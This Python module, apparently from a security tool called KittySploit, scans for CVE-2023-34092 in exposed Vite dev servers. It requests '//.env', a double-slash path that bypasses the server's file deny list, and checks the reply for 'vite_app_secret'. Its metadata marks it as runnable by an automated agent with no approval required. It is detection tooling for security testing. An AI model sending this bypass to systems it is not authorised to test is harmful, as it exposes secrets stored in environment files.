#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite dev server could allow reading files from the Vite project root by bypassing server."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vite Dev Server - Information Exposure Detection',
        'description': 'Vite dev server could allow reading files from the Vite project root by bypassing server.fs.deny with double forward-slash paths (//). This affects exposed dev servers only.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'env', 'vite', 'exposure', 'bypass'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-34092',
        ],
        'cve': 'CVE-2023-34092',
    }

    def run(self):
        path = '/.env'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '//.env'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('vite_app_secret',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Vite Dev Server - Information Exposure detected', path=path)
            return True
        return False

